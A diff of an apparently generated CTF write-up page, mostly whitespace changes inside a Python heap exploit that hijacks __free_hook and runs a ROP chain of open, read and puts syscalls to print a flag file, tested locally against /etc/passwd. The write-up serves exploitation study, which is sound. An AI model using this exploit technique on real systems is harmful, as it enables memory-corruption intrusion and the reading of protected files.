@@ -500,27 +500,26 @@ ropchain = ropchain.ljust(0xa0, <span style="color:#a31515">b</span><span style=
 ropchain += p64(rsp_value)
 ropchain += p64(rcx_value)
 
-ropchain += p64(pop_rax)                              <span style="color:#008000"># sets rax to the target syscall number</span>
-ropchain += p64(2)                                    <span style="color:#008000"># SYS_OPEN</span>
-ropchain += p64(pop_rdi)                              <span style="color:#008000"># pointer to path</span>
-ropchain += p64(heap_base + 0x7a0)		      <span style="color:#008000"># address of string /home/user/flag.txt</span>
+ropchain += p64(pop_rax)                                <span style="color:#008000"># sets rax to the target syscall number</span>
+ropchain += p64(2)                                      <span style="color:#008000"># SYS_OPEN</span>
+ropchain += p64(pop_rdi)                                <span style="color:#008000"># pointer to path</span>
+ropchain += p64(heap_base + 0x7a0)                      <span style="color:#008000"># address of string /home/user/flag.txt</span>
 ropchain += p64(syscall)
 
-ropchain += p64(pop_rdi)			      <span style="color:#008000"># sets the fd value</span>
-ropchain += p64(3)				      <span style="color:#008000"># fd of the recently opened file</span>
-ropchain += p64(pop_rsi)			      <span style="color:#008000"># sets the where the content will be written</span>
-ropchain += p64(heap_base)			      <span style="color:#008000"># any writeable address</span>
-ropchain += p64(pop_rdx)			      <span style="color:#008000"># sets the number of bytes to read</span>
+ropchain += p64(pop_rdi)                                <span style="color:#008000"># sets the fd value</span>
+ropchain += p64(3)                                      <span style="color:#008000"># fd of the recently opened file</span>
+ropchain += p64(pop_rsi)                                <span style="color:#008000"># sets the where the content will be written</span>
+ropchain += p64(heap_base)                              <span style="color:#008000"># any writeable address</span>
+ropchain += p64(pop_rdx)                                <span style="color:#008000"># sets the number of bytes to read</span>
 ropchain += p64(0x100)
 ropchain += p64(read)
 
-ropchain += p64(pop_rdi)			      <span style="color:#008000"># address of the data read</span>
+ropchain += p64(pop_rdi)                                <span style="color:#008000"># address of the data read</span>
 ropchain += p64(heap_base)
-ropchain += p64(puts)				      <span style="color:#008000"># prints out the data read</span>
-
+ropchain += p64(puts)
 
 add(0x800, ropchain)
-delete(5)                                             <span style="color:#008000"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
+delete(5)                                               <span style="color:#008000"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
 </code></pre></div><p>This works ! At the time of writing, the server is not up anymore, however running it locally and changing the flag path to <code>/etc/passwd</code> gives the expected output :</p>
 <div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 test.py
 ...
@@ -629,7 +628,7 @@ edit(1, p64(free_hook))
 
 add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;/etc/passwd</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>)
 add(0x60, p64(gadget))
-rsp_value = heap_base + 0xfd0                         <span style="color:#008000"># Calculated using a debugger</span>
+rsp_value = heap_base + 0xfd0                           <span style="color:#008000"># Calculated using a debugger</span>
 rcx_value = ret
 
 ropchain = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;</span>
@@ -637,21 +636,21 @@ ropchain = ropchain.ljust(0xa0, <span style="color:#a31515">b</span><span style=
 ropchain += p64(rsp_value)
 ropchain += p64(rcx_value)
 
-ropchain += p64(pop_rax)                              <span style="color:#008000"># sets rax to the target syscall number</span>
-ropchain += p64(2)                                    <span style="color:#008000"># SYS_OPEN</span>
-ropchain += p64(pop_rdi)                              <span style="color:#008000"># pointer to path</span>
-ropchain += p64(heap_base + 0x7a0)                    <span style="color:#008000"># address of string /home/user/flag.txt</span>
+ropchain += p64(pop_rax)                                <span style="color:#008000"># sets rax to the target syscall number</span>
+ropchain += p64(2)                                      <span style="color:#008000"># SYS_OPEN</span>
+ropchain += p64(pop_rdi)                                <span style="color:#008000"># pointer to path</span>
+ropchain += p64(heap_base + 0x7a0)                      <span style="color:#008000"># address of string /home/user/flag.txt</span>
 ropchain += p64(syscall)
 
-ropchain += p64(pop_rdi)                              <span style="color:#008000"># sets the fd value</span>
-ropchain += p64(3)                                    <span style="color:#008000"># fd of the recently opened file</span>
-ropchain += p64(pop_rsi)                              <span style="color:#008000"># sets the where the content will be written</span>
-ropchain += p64(heap_base)                            <span style="color:#008000"># any writeable address</span>
-ropchain += p64(pop_rdx)                              <span style="color:#008000"># sets the number of bytes to read</span>
+ropchain += p64(pop_rdi)                                <span style="color:#008000"># sets the fd value</span>
+ropchain += p64(3)                                      <span style="color:#008000"># fd of the recently opened file</span>
+ropchain += p64(pop_rsi)                                <span style="color:#008000"># sets the where the content will be written</span>
+ropchain += p64(heap_base)                              <span style="color:#008000"># any writeable address</span>
+ropchain += p64(pop_rdx)                                <span style="color:#008000"># sets the number of bytes to read</span>
 ropchain += p64(0x100)
 ropchain += p64(read)
 
-ropchain += p64(pop_rdi)                              <span style="color:#008000"># address of the data read</span>
+ropchain += p64(pop_rdi)                                <span style="color:#008000"># address of the data read</span>
 ropchain += p64(heap_base)
 ropchain += p64(puts)
 
